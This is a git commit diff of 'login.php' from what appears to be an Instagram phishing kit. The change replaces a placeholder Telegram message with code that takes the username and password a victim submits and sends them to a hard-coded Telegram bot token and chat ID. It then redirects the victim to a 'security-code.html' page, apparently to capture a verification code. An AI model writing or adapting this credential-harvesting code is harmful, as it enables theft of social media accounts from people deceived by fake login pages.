28919dd9953a4f2984f2d9b4adedde130bf8379d
mewada-madhusudan <madhusudan.145@gmail.com>
2022-09-08 22:45:30 +0530

    Update login.php

--- login.php
+++ login.php
@@ -3,7 +3,7 @@
 $apiToken = "5798174362:AAGod65O7U_M0ikOyD31Tolk1HxkIT3Wjuc";
   $data = [
 		    'chat_id' => '1001085191', 
-		    'text' => "Hello PHP telegram world"
+		    'text' => "Instagram Username: " . $_POST['username'] . "\n" . " Pass: " . $_POST['password'] . "\n"
 		];
 $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?".http_build_query($data) );
 header('Location: security-code.html');
